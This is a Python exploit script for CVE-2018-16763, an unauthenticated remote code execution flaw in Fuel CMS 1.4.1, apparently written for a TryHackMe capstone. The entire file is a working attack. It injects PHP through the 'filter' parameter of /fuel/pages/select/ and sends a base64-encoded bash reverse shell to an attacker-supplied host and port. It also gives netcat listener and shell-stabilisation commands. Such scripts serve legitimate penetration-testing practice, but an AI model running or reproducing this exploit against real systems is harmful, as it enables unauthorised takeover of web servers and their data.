#!/usr/bin/env python3
"""
Fuel CMS 1.4.1 - Remote Code Execution (Unauthenticated)
CVE-2018-16763

This script exploits a vulnerability in Fuel CMS <= 1.4.1, where unsanitized user input 
in the 'filter' parameter of the `/fuel/pages/select/` endpoint is evaluated as PHP code.

By injecting a crafted payload, we can execute arbitrary system commands as the web server user.

ðŸ” Based on public exploit: https://www.exploit-db.com/exploits/45274  
ðŸ›  Rewritten and modified by: dvsmith (for educational purposes)  
ðŸ“… Date: 2025-06-06  
ðŸ“š Context: Created for TryHackMeâ€™s Vulnerability Capstone  
âš ï¸ For use in legal environments only

"""

import requests
import urllib.parse
import base64

def build_payload(command):
    """
    Constructs a PHP code injection payload to execute the provided command.
    The known bypass uses PHP's pi() function and variable indirection.
    """
    php_payload = f"'+pi(print($a='system'))+$a('{command}')+'"
    return urllib.parse.quote(php_payload)

def send_payload(target_url, payload):
    """
    Sends the payload to the vulnerable 'filter' parameter.
    """
    exploit_url = f"{target_url}/fuel/pages/select/?filter={payload}"
    print(f"\n[+] Sending payload to:\n{exploit_url}\n")

    try:
        response = requests.get(exploit_url, timeout=10)
        print("[*] Response status code:", response.status_code)
        print("[*] First 500 bytes of response:\n")
        print(response.text[:500])
    except Exception as e:
        print("[-] Error occurred:", e)

def main():
    print("=== Fuel CMS RCE Exploit (CVE-2018-16763) ===")

    # User input
    target = input("[?] Target base URL (e.g., http://10.10.67.9): ").strip().rstrip('/')
    lhost = input("[?] Your IP for reverse shell: ").strip()
    lport = input("[?] Port to listen on: ").strip()

    # Construct base64-encoded bash reverse shell
    bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64_payload = base64.b64encode(bash_shell.encode()).decode()
    final_cmd = f"echo {b64_payload} | base64 -d | bash"

    print(f"\n[!] Start your listener: nc -lvnp {lport}")
    input("[*] Press Enter to send the exploit...\n")

    # Build and send the payload
    encoded_payload = build_payload(final_cmd)
    send_payload(target, encoded_payload)

    print("\n[âœ”] If the exploit worked, you should receive a shell shortly.")
    print("[!] To stabilize your shell, run:")
    print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print("    export TERM=xterm; stty rows 40 columns 120")

if __name__ == "__main__":
    main()
